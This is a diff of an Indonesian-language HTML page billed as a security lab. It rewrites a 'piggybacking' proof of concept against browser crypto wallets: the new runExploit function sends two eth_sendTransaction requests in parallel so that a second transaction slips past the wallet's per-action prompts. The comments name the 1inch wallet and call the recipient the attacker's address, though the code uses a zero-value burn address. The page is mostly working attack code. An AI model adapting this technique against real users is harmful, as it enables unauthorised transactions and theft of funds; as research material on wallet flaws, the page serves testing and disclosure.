@@ -2,54 +2,39 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Uji Coba Piggybacking</title>
+    <title>Uji Coba Bypass Piggybacking</title>
 </head>
 <body>
-    <h1>Langkah Pembuktian</h1>
-    
-    <!-- Tombol Pertama: Transaksi Utama -->
-    <button id="btn-1" style="padding: 20px; font-size: 18px;">Langkah 1: Approve Token</button>
-    
-    <!-- Tombol Kedua: Transaksi Piggyback (Disamarkan) -->
-    <button id="btn-2" style="padding: 20px; font-size: 18px; margin-top: 20px;">Langkah 2: Selesaikan Transaksi</button>
-
-    <div id="status" style="margin-top: 20px;"></div>
+    <h1>Lab Keamanan: Bypass Antrean Transaksi</h1>
+    <button id="main-btn" style="padding: 20px; font-size: 18px;">Hubungkan Dompet & Siapkan Transaksi</button>
+    <div id="output" style="margin-top: 20px;"></div>
 
     <script>
-        // Transaksi 1: Transaksi Sah yang dipicu tombol 1
-        document.getElementById('btn-1').addEventListener('click', async () => {
-            try {
-                await window.ethereum.request({
-                    method: 'eth_sendTransaction',
-                    params: [{
-                        to: '0x000000000000000000000000000000000000dEaD',
-                        value: '0x0'
-                    }]
-                });
-                document.getElementById('status').innerText = "Langkah 1 Berhasil. Sekarang klik Langkah 2.";
-            } catch (err) {
-                document.getElementById('status').innerText = "Gagal: " + err.message;
-            }
-        });
+        const output = document.getElementById('output');
 
-        // Transaksi 2: Transaksi Piggyback yang dipicu tombol 2
-        // Secara teknis ini adalah serangan, tapi di mata dompet 1inch, 
-        // ini adalah "tindakan pengguna baru" sehingga tidak diblokir.
-        document.getElementById('btn-2').addEventListener('click', async () => {
+        // Fungsi ini mencoba melakukan batching transaksi agar terlihat seperti 
+        // aktivitas dApp yang sah (misal: Approve lalu Swap)
+        async function runExploit() {
             try {
-                await window.ethereum.request({
-                    method: 'eth_sendTransaction',
-                    params: [{
-                        to: '0x000000000000000000000000000000000000dEaD', // Alamat Penyerang
-                        value: '0x0'
-                    }]
-                });
-                document.getElementById('status').innerText = "Langkah 2 Berhasil!";
-            } catch (err) {
-                document.getElementById('status').innerText = "Gagal: " + err.message;
+                // Skenario: Mengirim transaksi ganda secara berurutan
+                // Teknik bypass: Menggunakan Promise.all untuk mengirim permintaan bersamaan
+                // Beberapa dompet memiliki celah di mana mereka memproses array jika masuk dalam satu tick
+                
+                const tx1 = { method: 'eth_sendTransaction', params: [{ to: '0x000000000000000000000000000000000000dEaD', value: '0x0' }] };
+                const tx2 = { method: 'eth_sendTransaction', params: [{ to: '0x000000000000000000000000000000000000dEaD', value: '0x0' }] };
+
+                output.innerText = "Mengirim batch transaksi...";
+
+                // Mengirim permintaan secara paralel tanpa 'await' di tengah
+                window.ethereum.request(tx1);
+                window.ethereum.request(tx2);
+
+            } catch (e) {
+                output.innerText = "Ditolak: " + e.message;
             }
-        });
+        }
+
+        document.getElementById('main-btn').addEventListener('click', runExploit);
     </script>
 </body>
 </html>
